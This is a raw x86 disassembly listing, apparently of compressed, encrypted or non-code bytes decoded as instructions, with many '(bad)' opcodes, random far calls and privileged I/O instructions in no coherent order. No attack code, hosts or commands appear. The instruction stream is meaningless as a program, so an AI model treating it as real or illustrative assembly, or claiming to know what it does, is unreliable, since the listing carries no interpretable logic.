  426d30:	jno    0x426d6a
  426d32:	sbb    DWORD PTR [ebx+0x26],0xffffffd5
  426d36:	iret   
  426d37:	imul   edi,DWORD PTR [ebx-0xb2a03fd],0xffffffc9
  426d3e:	or     ecx,DWORD PTR [ebp+edx*2+0x4e]
  426d42:	xchg   edx,eax
  426d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d44:	add    dh,bl
  426d46:	into   
  426d47:	and    al,0x72
  426d49:	std    
  426d4a:	mov    edi,0x7d396b2f
  426d4f:	aad    0x43
  426d51:	jl     0x426da8
  426d53:	push   ebx
  426d54:	jp     0x426d12
  426d56:	das    
  426d57:	cld    
  426d58:	std    
  426d59:	nop
  426d5a:	xchg   edx,eax
  426d5b:	jg     0x426db4
  426d5d:	outs   dx,DWORD PTR ds:[esi]
  426d5e:	fistp  WORD PTR [ebp-0x180e54c1]
  426d64:	wbinvd 
  426d66:	sbb    cl,BYTE PTR [eax+0x7a]
  426d69:	inc    esp
  426d6a:	sbb    bh,BYTE PTR [ebx]
  426d6c:	sub    BYTE PTR [ebp+0x5aec22ae],bh
  426d72:	leave  
  426d73:	inc    ebp
  426d74:	hlt    
  426d75:	lock and ebp,esp
  426d78:	xacquire xchg BYTE PTR [ecx+ecx*2+0x33],ah
  426d7d:	push   esi
  426d7e:	lea    esi,[ebx+0x5031b445]
  426d84:	outs   dx,BYTE PTR ds:[esi]
  426d85:	adc    DWORD PTR [esi-0x42c382],0xe12cdf53
  426d8f:	xor    BYTE PTR [eax+0x0],ah
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xb70c:0xc7c2ecf9
  426e01:	pushf  
  426e02:	sbb    ch,bh
  426e04:	into   
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0xa2000001
  426e0d:	arpl   bp,bx
  426e0f:	jae    0x426e3c
  426e11:	dec    esp
  426e12:	loope  0x426dc2
  426e14:	dec    eax
  426e15:	in     al,dx
  426e16:	(bad)
  426e19:	fadd   st(2),st
  426e1b:	pop    ecx
  426e1c:	int    0xf8
  426e1e:	sbb    ebx,eax
  426e20:	das    
  426e21:	xchg   ebx,eax
  426e22:	mov    edx,0xafb61376
  426e27:	xchg   ecx,eax
  426e28:	icebp  
  426e29:	add    eax,0xd17258bb
  426e2e:	or     eax,eax
  426e30:	in     al,0x3b
  426e32:	clc    
  426e33:	stc    
  426e34:	adc    eax,0xd42042df
  426e39:	pop    edx
  426e3a:	lds    edx,FWORD PTR [eiz*8-0x3ff4f943]
  426e41:	xor    esi,ebx
  426e43:	arpl   sp,dx
  426e45:	stos   DWORD PTR es:[edi],eax
  426e46:	mov    bl,0x26
  426e48:	data16 aam 0x31
  426e4b:	into   
  426e4c:	mov    dh,0x69
  426e4e:	fs pop esp
  426e50:	gs add bl,bh
  426e53:	or     eax,0x487b2e5e
  426e58:	and    DWORD PTR [edx-0x5e],ebp
  426e5b:	sub    al,0xe6
  426e5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e5e:	jecxz  0x426e45
  426e60:	inc    edx
  426e61:	cmp    DWORD PTR [edi],esp
  426e63:	mov    WORD PTR [esi],fs
  426e65:	mov    dl,0xb0
  426e67:	mov    dh,0x56
  426e69:	in     al,dx
  426e6a:	jb     0x426e0a
  426e6c:	adc    DWORD PTR [eax+0x1e],edx
  426e6f:	lods   al,BYTE PTR ds:[esi]
  426e70:	add    al,0x86
  426e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e73:	adc    BYTE PTR ds:0x6380a31c,dl
  426e79:	mov    WORD PTR [ecx+0x3b2751db],ss
  426e7f:	sar    ebp,cl
  426e81:	imul   eax,DWORD PTR [esi],0x5b9739ab
  426e87:	sub    BYTE PTR [ebx-0x38],bh
  426e8a:	(bad)  
  426e8b:	and    al,0x7d
  426e8d:	aaa    
  426e8e:	popa   
  426e8f:	dec    esp
  426e90:	test   al,0x5
  426e92:	stc    
  426e93:	out    dx,al
  426e94:	xor    eax,0xbabb183f
  426e99:	or     eax,0x7c7fd8fe
  426e9e:	(bad)
  426ea3:	out    0x8,al
  426ea5:	in     al,dx
  426ea6:	pop    ebp
  426ea7:	pusha  
  426ea8:	xchg   esp,eax
  426ea9:	sbb    eax,0xf6e60a27
  426eae:	sbb    esp,eax
  426eb0:	jp     0x426f09
  426eb2:	fnsave [eax+0x48]
  426eb5:	mov    esi,DWORD PTR [edi-0x6e]
  426eb8:	ds inc eax
  426eba:	dec    eax
  426ebb:	nop
  426ebc:	adc    al,BYTE PTR [ebx+eax*4]
  426ebf:	dec    esi
  426ec0:	sahf   
  426ec1:	ins    DWORD PTR es:[edi],dx
  426ec2:	int    0x7d
  426ec4:	jb     0x426ed7
  426ec6:	jne    0x426ec5
  426ec8:	push   ds
  426ec9:	mov    ah,0xe4
  426ecb:	adc    eax,0x51a869d1
  426ed0:	push   ebx
  426ed1:	fimul  DWORD PTR [esi+0xf96a6ec]
  426ed7:	or     DWORD PTR [edx+0x45],edx
  426eda:	test   al,0xc9
  426edc:	in     eax,0xa8
  426ede:	fisttp WORD PTR [edx]
  426ee0:	adc    edx,ebp
  426ee2:	mov    ah,0xd1
  426ee4:	inc    ecx
  426ee5:	or     eax,0x79e07bee
  426eea:	dec    edi
  426eeb:	mov    si,0x9dca
  426eef:	pop    es
  426ef0:	stos   BYTE PTR es:[edi],al
  426ef1:	mov    bl,0x64
  426ef3:	imul   ecx,DWORD PTR [ecx-0x42],0xc62e25fb
  426efa:	pusha  
  426efb:	pop    esi
  426efc:	inc    ecx
  426efd:	mov    ebp,0xf6b2d8c2
  426f02:	pusha  
  426f03:	int3   
  426f04:	sar    DWORD PTR [ebp+0x51],1
  426f07:	icebp  
  426f08:	ret    
  426f09:	call   0xc9ea:0xa1d4c1b8
  426f10:	jb     0x426f12
	...
  426f72:	add    BYTE PTR [eax],al
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [edi+ebx*1-0x2c434315],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	mov    eax,ds:0xdd93552b
  426f91:	and    eax,0x6dca40
  426f96:	inc    ebx
  426f97:	push   cs
  426f98:	inc    esi
  426f99:	push   ss
  426f9a:	test   BYTE PTR [eax+0x333187cb],ah
  426fa0:	add    ebx,DWORD PTR [ebx+0x19]
  426fa3:	(bad)  
  426fa4:	xor    eax,0xfd897745
  426fa9:	test   BYTE PTR [edx+0x30],ah
  426fac:	mov    dl,0x72
  426fae:	popf   
  426faf:	into   
  426fb0:	xchg   ebp,eax
  426fb1:	sub    eax,0xce36c46c
  426fb6:	lds    esp,FWORD PTR [eax]
  426fb8:	push   es
  426fb9:	mov    si,bp
  426fbc:	gs stos BYTE PTR es:[edi],al
  426fbe:	adc    bh,BYTE PTR [esi+0x44]
  426fc1:	test   bh,dl
  426fc3:	iret   
  426fc4:	jns    0x426f69
  426fc6:	xchg   BYTE PTR [eax-0x6c],al
  426fc9:	jb     0x426f93
  426fcb:	imul   eax,DWORD PTR gs:0xe6770ba2,0xffffff8b
  426fd3:	jb     0x426f61
  426fd5:	div    esp
  426fd7:	repz jl 0x426f61
  426fda:	arpl   WORD PTR [esi],dx
  426fdc:	or     DWORD PTR [edi+0x11ae9673],ebp
  426fe2:	aam    0x4f
  426fe4:	mov    edx,0x28c32f68
  426fe9:	enter  0x7b7b,0x2d
  426fed:	and    DWORD PTR [ebx],ebp
  426fef:	mov    dh,0xb6
  426ff1:	mov    edi,0xb235ed2a
  426ff6:	bound  edi,QWORD PTR [ebx-0x44]
  426ff9:	icebp  
  426ffa:	test   al,0x86
  426ffc:	aas    
  426ffd:	das    
  426ffe:	mov    eax,0x6f19c5a6
  427003:	scas   eax,DWORD PTR es:[edi]
  427004:	pop    es
  427005:	(bad)  
  427006:	das    
  427007:	(bad)  
  427008:	mov    esp,0x8647e2a8
  42700d:	mov    dl,BYTE PTR [edi-0x3c]
  427010:	int    0xa7
  427012:	sbb    al,0x44
  427014:	xchg   ebx,eax
  427015:	ss ds jno 0x427038
  427019:	jecxz  0x42706a
  42701b:	or     DWORD PTR [ebp-0x5436647d],0x35bd6680
  427025:	shr    BYTE PTR [ebx+0x63e85c55],0xf2
  42702c:	jle    0x427022
  42702e:	sar    cl,cl
  427030:	mov    BYTE PTR [edx-0x79],al
  427033:	mov    cl,BYTE PTR [ecx+0x3a]
  427036:	imul   ecx,DWORD PTR [ebx+ebp*8+0x22bb5661],0x2c0ed497
  427041:	test   BYTE PTR [ebp-0x9],bh
  427044:	cwde   
  427045:	and    DWORD PTR [ecx+0x563eaf68],eax
  42704b:	leave  
  42704c:	add    eax,0xb738ae8c
  427051:	aas    
  427052:	or     al,0xd
  427054:	hlt    
  427055:	inc    ecx
  427056:	or     ebp,DWORD PTR [ecx]
  427058:	mov    ch,0xb
  42705a:	and    DWORD PTR [ecx+eax*2-0x1],esp
  42705e:	jnp    0x427035
  427060:	or     BYTE PTR [eax],bh
  427062:	dec    esp
  427063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427064:	sahf   
  427065:	jae    0x42707c
  427067:	dec    ecx
  427068:	mov    edx,0xca2eee4c
  42706d:	nop
  42706e:	mov    bl,0x9
  427070:	push   es
  427071:	pop    esp
  427072:	mov    edi,0x973fc47f
  427077:	mov    esi,0x46d38bb7
  42707c:	daa    
  42707d:	mov    ecx,0x55284c49
  427082:	jle    0x427045
  427084:	pop    eax
  427085:	push   ecx
  427086:	cmc    
  427087:	dec    ebx
  427088:	stc    
  427089:	sbb    edx,eax
  42708b:	mov    ds:0x8147843c,eax
  427090:	push   edi
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x8fca9d96
  427102:	push   ds
  427103:	rcr    al,cl
  427105:	mov    eax,ds:0x1050001
  42710a:	add    BYTE PTR [eax],al
  42710c:	sub    bh,BYTE PTR cs:[ebx]
  42710f:	dec    esp
  427110:	jne    0x42711b
  427112:	jns    0x427154
  427114:	gs fcom st(4)
  427117:	pop    ss
  427118:	pop    ecx
  427119:	jle    0x4270d6
  42711b:	(bad)  
  42711d:	sub    al,0x94
  42711f:	pop    eax
  427120:	in     eax,dx
  427121:	sbb    bl,al
  427123:	mov    edi,DWORD PTR [ebx+0x2c]
  427126:	lods   eax,DWORD PTR ds:[esi]
  427127:	cmc    
  427128:	sub    esi,DWORD PTR [eax]
  42712a:	(bad)  
  42712b:	(bad)  
  42712c:	and    al,0x5e
  42712e:	loopne 0x427155
  427130:	pop    edx
  427131:	out    0x5f,al
  427133:	ret    
  427134:	leave  
  427135:	mov    edx,0xd6a1299
  42713a:	cmp    DWORD PTR [ecx-0x8],edx
  42713d:	imul   ecx,DWORD PTR [bp+di-0x7e7d],0xc1f1624d
  427146:	jno    0x42717a
  427148:	aas    
  427149:	push   edi
  42714a:	pop    esi
  42714b:	out    0x25,eax
  42714d:	inc    edx
  42714e:	arpl   WORD PTR ds:0xcb685cf7,sp
  427154:	push   0x9962d08d
  427159:	sbb    al,0x17
  42715b:	sub    dl,dh
  42715d:	pushf  
  42715e:	push   es
  42715f:	cld    
  427160:	push   ds
  427161:	sti    
  427162:	add    bl,BYTE PTR [ecx+0x4c]
  427165:	mov    dx,0xe4ec
  427169:	push   es
  42716a:	inc    ebp
  42716b:	push   ebx
  42716c:	jp     0x427129
  42716e:	hlt    
  42716f:	sub    eax,0xc4bee8ef
  427174:	push   ebx
  427175:	xlat   BYTE PTR ds:[bx]
  427177:	daa    
  427178:	sub    ebp,esi
  42717a:	fdiv   DWORD PTR [esi-0x1c73aca7]
  427180:	pop    ss
  427181:	inc    esp
  427182:	jl     0x42717e
  427184:	popf   
  427185:	jmp    FWORD PTR [esi+0x31]
  427188:	dec    eax
  427189:	repnz retf 0x829b
  42718d:	retf   0xc25f
  427190:	push   ss
  427191:	sbb    DWORD PTR [edi+0x15],esi
  427194:	f2xm1  
  427196:	or     al,ch
  427198:	popa   
  427199:	repnz call 0x431e:0x3a33
  4271a0:	pop    ds
  4271a1:	in     al,0xf6
  4271a3:	jbe    0x427125
  4271a5:	xor    BYTE PTR [ebx+ecx*1],al
  4271a8:	je     0x427225
  4271aa:	xchg   ebx,eax
  4271ab:	adc    al,0x3a
  4271ad:	js     0x427134
  4271af:	jl     0x42721d
  4271b1:	test   eax,0xa6ef17c6
  4271b6:	mov    dl,0xc8
  4271b8:	pop    eax
  4271b9:	lea    ebp,[esi+0x29]
  4271bc:	mov    dh,BYTE PTR [ecx-0x48b587fb]
  4271c2:	dec    esp
  4271c3:	fdiv   st(6),st
  4271c5:	pop    es
  4271c6:	mov    ecx,0x5e167d46
  4271cb:	xor    DWORD PTR [edx-0x55fed503],ebp
  4271d1:	inc    esp
  4271d2:	mov    BYTE PTR [ebx],0xa0
  4271d5:	cli    
  4271d6:	sbb    al,0x67
  4271d8:	push   ebp
  4271d9:	pop    eax
  4271da:	cld    
  4271db:	inc    ebx
  4271dc:	imul   esi,DWORD PTR [edi+0x40e86772],0xffffffe5
  4271e3:	sub    eax,0x61534165
  4271e8:	ret    
  4271e9:	call   0x1394:0x2c9b265e
  4271f0:	scas   eax,DWORD PTR es:[edi]
  4271f1:	daa    
  4271f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271f3:	push   ss
  4271f4:	push   esi
  4271f5:	sub    eax,0xee862f27
  4271fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271fb:	push   edi
  4271fc:	ficom  DWORD PTR [edi-0x23c18fd2]
  427202:	cdq    
  427203:	lds    esi,FWORD PTR [ebx-0x4083a33d]
  427209:	stc    
  42720a:	fmul   DWORD PTR [ecx]
  42720c:	cmc    
  42720d:	push   cs
  42720e:	stc    
  42720f:	jnp    0x4271c8
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x2b400fad,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	mov    eax,0x6685708f
  427291:	jne    0x427218
  427293:	stc    
  427294:	(bad)  
  427295:	mov    al,ds:0x90b4519d
  42729a:	or     al,0xf1
  42729c:	xchg   ebp,eax
  42729d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42729e:	xor    ah,bl
  4272a0:	in     eax,0xea
  4272a2:	cmp    DWORD PTR ds:0xb50b8a8f,esi
  4272a8:	sti    
  4272a9:	dec    ebp
  4272aa:	imul   esp,DWORD PTR [eax-0x61],0x14031178
  4272b1:	sbb    eax,0x51ce13e7
  4272b6:	jl     0x42732d
  4272b8:	jle    0x427309
  4272ba:	xchg   esi,eax
  4272bb:	or     DWORD PTR [ecx-0x6f5eebf4],edi
  4272c1:	push   es
  4272c2:	addr16 dec edx
  4272c4:	push   ebx
  4272c5:	cmp    cl,BYTE PTR [esi+0x24fc36]
  4272cb:	jne    0x4272ef
  4272cd:	scas   al,BYTE PTR es:[edi]
  4272ce:	xor    al,0xe2
  4272d0:	lock je 0x42726a
  4272d3:	mov    ch,0xe9
  4272d5:	fistp  WORD PTR [esi-0x73]
  4272d8:	nop
  4272d9:	mov    cl,0x1f
  4272db:	iret   
  4272dc:	nop
  4272dd:	int3   
  4272de:	addr16 inc edi
  4272e0:	xor    BYTE PTR [esi-0x521e2b59],dl
  4272e6:	out    0xbd,eax
  4272e8:	clc    
  4272e9:	mov    bl,0x2e
  4272eb:	dec    ebx
  4272ec:	xchg   edi,eax
  4272ed:	adc    al,0x16
  4272ef:	leave  
  4272f0:	push   eax
  4272f1:	xchg   bx,ax
  4272f3:	add    DWORD PTR [edi],ecx
  4272f5:	push   esp
  4272f6:	ins    DWORD PTR es:[edi],dx
  4272f7:	in     al,0x98
  4272f9:	outs   dx,DWORD PTR ds:[esi]
  4272fa:	pop    ds
  4272fb:	stc    
  4272fc:	push   0xffffff8e
  4272fe:	(bad)  
  427300:	pusha  
  427301:	adc    eax,0xc119068d
  427306:	hlt    
  427307:	mov    cl,0x47
  427309:	cli    
  42730a:	fsubr  QWORD PTR [ebx]
  42730c:	shr    BYTE PTR [edi+0x97cc459],1
  427312:	jns    0x4272f1
  427314:	push   ss
  427315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427316:	cmc    
  427317:	stc    
  427318:	xchg   ecx,eax
  427319:	add    al,0xc8
  42731b:	addr16 test al,0x3a
  42731e:	mov    bh,0xc6
  427320:	pop    ecx
  427321:	int3   
  427322:	fsub   QWORD PTR [eax+0x818b13d]
  427328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427329:	jg     0x4272d4
  42732b:	inc    ebx
  42732c:	jo     0x427385
  42732e:	xchg   BYTE PTR [ebx-0x59e5c505],al
  427334:	add    eax,0x6060ade6
  427339:	mov    esp,ss
  42733b:	retf   
  42733c:	in     al,dx
  42733d:	sub    al,0x14
  42733f:	in     eax,0xc
  427341:	inc    esi
  427342:	push   0x7a
  427344:	in     al,dx
  427345:	jge    0x4272fc
  427347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427348:	lahf   
  427349:	and    eax,DWORD PTR [edx-0x27b6c225]
  42734f:	push   0x0
  427351:	or     BYTE PTR [ecx],dl
  427353:	mov    DWORD PTR [eax],ecx
  427355:	xor    esp,ecx
  427357:	xor    cl,bh
  427359:	das    
  42735a:	mov    bh,0xc
  42735c:	mov    ebx,0x6e8962d4
  427361:	inc    ecx
  427362:	enter  0x1262,0x62
  427366:	mov    eax,ds:0x30f88ffb
  42736b:	adc    esi,DWORD PTR [ebp+0x51b7902e]
  427371:	mov    WORD PTR [edi+0x35],?
  427374:	mov    cs,WORD PTR [ebx+0x25]
  427377:	fsubr  DWORD PTR [ecx]
  427379:	mov    bh,0xb4
  42737b:	jge    0x427300
  42737d:	or     BYTE PTR [esp+ebx*4-0x3e],bl
  427381:	adc    al,0x93
  427383:	pushf  
  427384:	add    cl,BYTE PTR [ebx-0x64c6ac05]
  42738a:	inc    edx
  42738b:	adc    eax,0xfd0fce1a
  427390:	jb     0x427392
	...
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebx,DWORD PTR [edx]
  427401:	(bad)  [ecx]
  427403:	push   eax
  427404:	loop   0x4273a9
  427406:	add    DWORD PTR [eax],eax
  427408:	add    eax,0x50000001
  42740d:	push   ebx
  42740e:	sbb    ebp,DWORD PTR ds:0xb3f12c9e
  427414:	loopne 0x42739a
  427416:	push   ebp
  427417:	and    bl,0x33
  42741a:	pop    ebp
  42741b:	add    al,0x4d
  42741d:	cwde   
  42741e:	jle    0x4273e4
  427420:	jae    0x42748b
  427422:	mov    ds:0x29ca22a,al
  427427:	sti    
  427428:	push   ebx
  427429:	cmovp  ecx,DWORD PTR [edi-0x43c70243]
  427430:	cmp    eax,DWORD PTR [eax+ebx*8]
  427433:	jae    0x427484
  427435:	adc    BYTE PTR [edx],ch
  427437:	in     eax,0xad
  427439:	lea    edx,[eax-0x739ab8d4]
  42743f:	js     0x4274ae
  427441:	cmp    esp,DWORD PTR [ecx+0x0]
  427444:	and    dl,BYTE PTR [esi]
  427446:	jbe    0x427412
  427448:	pop    ecx
  427449:	(bad)  
  42744a:	sbb    dl,BYTE PTR [edi+edi*4+0x0]
  42744e:	inc    edi
  42744f:	lea    ebp,[eax+0x3e]
  427452:	shl    ecx,1
  427454:	push   ss
  427455:	add    ah,BYTE PTR [edi+0x5e]
  427458:	out    dx,eax
  427459:	sbb    DWORD PTR [ecx+0x73],esp
  42745c:	rol    DWORD PTR [ebx-0x5d],0xea
  427460:	rcl    BYTE PTR [ecx],0xfe
  427463:	cs (bad) 
  427466:	rol    DWORD PTR [eax+0x34],cl
  427469:	repz test eax,0x5a8bb7c0
  42746f:	adc    edx,DWORD PTR [ecx]
  427471:	(bad)  
  427472:	and    ebx,DWORD PTR [ebx+edi*4+0x2f586315]
  427479:	ds popf 
  42747b:	repnz int3 
  42747d:	and    ch,BYTE PTR [esp+eiz*4]
  427480:	xchg   esp,eax
  427481:	mov    eax,0x1e4cf645
  427486:	mov    ecx,0xd47cde53
  42748b:	dec    ebx
  42748c:	cmp    DWORD PTR [esi],edi
  42748e:	je     0x4274fd
  427490:	test   eax,0x484053f0
  427495:	clc    
  427496:	fdivr  DWORD PTR [eax+0xde38362]
  42749c:	(bad)
  4274a0:	jbe    0x4274e3
  4274a2:	mov    dl,0x7
  4274a4:	leave  
  4274a5:	ficom  DWORD PTR [edi-0x21]
  4274a8:	adc    al,0x1e
  4274aa:	cmp    ebx,ecx
  4274ac:	aam    0x69
  4274ae:	sbb    BYTE PTR [edi-0x5],al
  4274b1:	xchg   ebx,eax
  4274b2:	and    DWORD PTR ds:0x6c5b74bc,edx
  4274b8:	mov    al,ds:0x3c5fcddc
  4274bd:	fidiv  WORD PTR [ebx-0x1]
  4274c0:	pop    edx
  4274c1:	sub    dl,ch
  4274c3:	es pop esp
  4274c5:	fld    DWORD PTR [edi]
  4274c7:	add    eax,0x9935670
  4274cc:	in     al,dx
  4274cd:	xchg   ecx,eax
  4274ce:	dec    ebp
  4274cf:	ret    0xc7e2
  4274d2:	clc    
  4274d3:	sbb    dh,BYTE PTR [ebp+edx*1-0x1345ea87]
  4274da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274db:	into   
  4274dc:	cmp    cl,0x86
  4274df:	(bad)  
  4274e0:	imul   edx,DWORD PTR [edi-0x2f],0x62
  4274e4:	stc    
  4274e5:	gs clc 
  4274e7:	lods   al,BYTE PTR ds:[esi]
  4274e8:	test   BYTE PTR [ecx],dl
  4274ea:	test   DWORD PTR [edx],edx
  4274ec:	fistp  QWORD PTR [ecx-0x3a]
  4274ef:	inc    ecx
  4274f0:	jmp    0x7f21091e
  4274f5:	pop    DWORD PTR [ebx+esi*1-0x403c6494]
  4274fc:	rcr    ch,cl
  4274fe:	mov    DWORD PTR [eax+ebp*2-0x4b],eax
  427502:	pop    ebp
  427503:	cmp    cl,BYTE PTR [edx+0x39eb4621]
  427509:	sbb    al,0x53
  42750b:	test   al,0xa
  42750d:	dec    ebp
  42750e:	add    al,0x58
  427510:	adc    eax,0x0
	...
  427571:	add    BYTE PTR [eax],al
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	mov    fs,WORD PTR [edi+0x10]
  427583:	das    
  427584:	out    0xa4,eax
  427586:	add    DWORD PTR [eax],eax
  427588:	add    eax,0x31000001
  42758d:	pop    es
  42758e:	pushf  
  42758f:	out    dx,al
  427590:	adc    BYTE PTR [ebx],ch
  427592:	pop    es
  427593:	pop    es
  427594:	or     BYTE PTR [eax+eiz*4],0x57
  427598:	test   ax,0xb056
  42759c:	outs   dx,DWORD PTR ds:[esi]
  42759d:	fmul   st(5),st
  42759f:	and    eax,0xba20d32b
  4275a4:	add    ebx,edx
  4275a6:	sub    DWORD PTR [edx+0x7e3ecb11],edi
  4275ac:	cmp    eax,0xceab92ac
  4275b1:	outs   dx,DWORD PTR ds:[esi]
  4275b2:	cmp    ebx,ecx
  4275b4:	push   cs
  4275b5:	fdiv   QWORD PTR [edi-0x32]
  4275b8:	jle    0x42753b
  4275ba:	add    edi,DWORD PTR [edi+0x9a24602]
  4275c0:	push   ecx
  4275c1:	mov    ds:0x875b5ac2,al
  4275c6:	imul   BYTE PTR [eax]
  4275c8:	shl    DWORD PTR [ecx+0xc],1
  4275cb:	mov    ds:0x55101612,al
  4275d0:	daa    
  4275d1:	test   al,0x8f
  4275d3:	push   ebp
  4275d4:	jecxz  0x42763d
  4275d6:	cmc    
  4275d7:	push   esp
  4275d8:	retf   0xf672
  4275db:	test   al,0xd
  4275dd:	and    bl,BYTE PTR [edx+0x55e85cef]
  4275e3:	fwait
  4275e4:	and    ah,BYTE PTR [eax-0x2a]
  4275e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275e8:	call   0x4cf283d9
  4275ed:	add    DWORD PTR [ecx],ecx
  4275ef:	push   ds
  4275f0:	test   eax,0xcca0f132
  4275f5:	iret   
  4275f6:	inc    ecx
  4275f7:	inc    eax
  4275f8:	jg     0x427672
  4275fa:	ret    0xe0fa
  4275fd:	stos   DWORD PTR es:[edi],eax
  4275fe:	or     BYTE PTR [eax+esi*2+0x5e6e1cb0],dl
  427605:	mov    edi,0xc51e3eb5
  42760a:	or     esi,DWORD PTR [edx+ebp*1+0x27]
  42760e:	sub    cl,BYTE PTR [esi-0x40b290ab]
  427614:	inc    eax
  427615:	adc    eax,0x5fd91f3f
  42761a:	(bad)  
  42761b:	aad    0x1f
  42761d:	mov    ch,0x18
  42761f:	pop    esi
  427620:	jp     0x427649
  427622:	cmp    eax,0xe99ee851
  427627:	(bad)  
  427628:	leave  
  427629:	xchg   ebx,eax
  42762a:	xchg   DWORD PTR [ecx],eax
  42762c:	das    
  42762d:	out    dx,al
  42762e:	mov    al,ds:0xbcfbdae8
  427633:	push   esi
  427634:	dec    esi
  427635:	leave  
  427636:	cdq    
  427637:	cmp    DWORD PTR [ebp+0x18a33d11],eax
  42763d:	cmp    esp,eax
  42763f:	test   DWORD PTR [ecx+eiz*1],ebx
  427642:	mov    bh,0x8c
  427644:	rcr    DWORD PTR [ecx],1
  427646:	and    DWORD PTR [eax+ebx*2-0x40af9d08],edx
  42764d:	inc    ebp
  42764e:	mov    ds:0x5592c0a3,eax
  427653:	out    dx,al
  427654:	(bad)  
  427655:	inc    BYTE PTR [ecx+0x1ab01f7a]
  42765b:	sub    eax,0x793a7046
  427660:	push   0x51225130
  427665:	xchg   cl,ah
  427667:	test   DWORD PTR [ebp+0x24],ebp
  42766a:	sub    DWORD PTR [eax+0x7077c57e],ebp
  427670:	loopne 0x427644
  427672:	pushf  
  427673:	fistp  WORD PTR [esi-0x16df147]
  427679:	popa   
  42767a:	mov    DWORD PTR [ecx+0x7f91dea],ebx
  427680:	mov    DWORD PTR [eax+0x29b59521],ebx
  427686:	dec    esp
  427687:	cld    
  427688:	and    al,0xf6
  42768a:	adc    esp,DWORD PTR [edi-0x499b935c]
  427690:	add    BYTE PTR [bx+si],al
	...
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fld    DWORD PTR [eax-0x135dd58f]
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0x8e000001
  42770d:	push   esi
  42770e:	inc    ebx
  42770f:	push   cs
  427710:	cmp    al,0x1b
  427712:	jns    0x4276a1
  427714:	sub    bh,al
  427716:	dec    esp
  427717:	ins    BYTE PTR es:[edi],dx
  427718:	pop    DWORD PTR [ecx-0x28]
  42771b:	xor    DWORD PTR [esi+0x7f],esp
  42771e:	mov    bh,0x66
  427720:	jge    0x427796
  427722:	pop    ecx
  427723:	and    ah,0xcd
  427726:	dec    eax
  427727:	pop    ds
  427728:	aad    0x4a
  42772a:	out    dx,al
  42772b:	mov    ch,0xf
  42772d:	cs jmp 0x820bedcc
  427733:	jmp    0xc7ac:0xa10b21e2
  42773a:	and    al,0x4d
  42773c:	pop    edi
  42773d:	pop    ds
  42773e:	jno    0x4277bd
  427740:	cmp    BYTE PTR [ebx],al
  427742:	jmp    0x24f427cf
  427747:	repz cmp DWORD PTR [edx-0x3c],0xe74a3ea2
  42774f:	and    ch,BYTE PTR [ebp-0x32]
  427752:	or     BYTE PTR [ecx-0x48a7d197],al
  427758:	mov    eax,DWORD PTR [ebp+0x5a]
  42775b:	cmp    DWORD PTR [edi],eax
  42775d:	rol    DWORD PTR [eax+0x6a],1
  427760:	enter  0xfb38,0x8
  427764:	(bad)  
  427765:	ror    BYTE PTR [esi],cl
  427767:	mov    DWORD PTR [esi-0xa14c99f],ecx
  42776d:	out    dx,eax
  42776e:	(bad)  
  42776f:	repz cmp DWORD PTR [ebx],0xffffffed
  427773:	add    ah,BYTE PTR [edi-0x64]
  427776:	add    esi,DWORD PTR [edx+0x3a]
  427779:	(bad)  
  42777b:	repz out dx,al
  42777d:	aas    
  42777e:	in     eax,0xa8
  427780:	add    ch,BYTE PTR [ecx+0x12]
  427783:	out    dx,al
  427784:	inc    edx
  427785:	sbb    al,0x3b
  427787:	jo     0x427722
  427789:	sub    dl,BYTE PTR [edx-0x6a]
  42778c:	nop
  42778d:	scas   al,BYTE PTR es:[edi]
  42778e:	mov    ch,0x92
  427790:	mov    BYTE PTR [esi+0x4fcdff3c],ah
  427796:	sbb    BYTE PTR [edx-0x846da8b],0xd7
  42779d:	jo     0x4277f2
  42779f:	add    eax,0xcf4bf5a3
  4277a4:	repnz into 
  4277a6:	adc    dl,0xd8
